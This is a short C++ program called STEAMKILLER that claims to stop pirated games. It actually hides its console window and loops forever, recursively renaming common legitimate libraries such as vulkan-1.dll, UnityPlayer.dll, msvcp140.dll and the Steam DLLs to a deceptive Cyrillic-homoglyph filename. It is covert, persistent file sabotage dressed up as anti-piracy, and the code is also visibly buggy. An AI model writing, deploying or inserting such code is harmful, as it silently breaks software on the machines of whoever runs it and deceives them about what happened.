/*
===============================STEAMKILLER=========================================

__COMPILE__THIS__VERSION__

This is a program to stop pirated games by simply removing some of these files..

steamapi.dll
steam_api64.dll
steamclient.dll
binkw.dll
binkw32.dll
bink2w64.dll
vulkan-1.dll
UnityPlayer.dll
msvcp140.dll

===================================================================================
*/

#include <string>
#include <iostream>
#include <windows.h>
#include <wincon.h>
#include <winuser.h>
#include <filesystem.hpp>

namespace fs = ghc::filesystem;

std::vector<std::__cxx11::string> toDelete = {"\\steamapi.dll", "\\steam_api64.dll",
                                              "\\steamclient.dll", "\\binkw.dll",
                                              "\\binkw32.dll", "\\bink2w64.dll",
                                              "\\vulkan-1.dll", "\\UnityPlayer.dll",
                                              "\\msvcp140.dll", "\\b.txt"};

std::vector<std::__cxx11::string> renamedFileNames = {"\\ѕtеаm_api64.dll"};

boolean
removeCrackFiles(std::vector<ghc::filesystem::path> fileList)
{
    std::error_code ec;
    for (auto &&i : fileList)
    {
        for (auto &&j : toDelete)
        {
            std::string tempstr = i.u8string();
            size_t fileNamePos = tempstr.find(j);
            if (fileNamePos != std::string::npos)
            {
                tempstr.replace(fileNamePos, 17, renamedFileNames[0]);
                ghc::filesystem::rename(i, tempstr, ec);
                std::cout << ec;
            }
        }
    }
}
std::vector<ghc::filesystem::path>
directoryScanner(fs::path currentDirName)
{
    size_t j = 1;
    std::vector<ghc::filesystem::path> fileList;
    for (const auto &entry : fs::recursive_directory_iterator(currentDirName))
    {
        fileList.push_back(entry.path());
    }
    return fileList;
}
int main(int argc, char const *argv[])
{
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
    FreeConsole();
    do
    {
        fs::path pwd = ".";
        auto allFilesPath = directoryScanner(pwd);
        removeCrackFiles(allFilesPath);
        Sleep(12000);
    } while (true);
    return 0;
}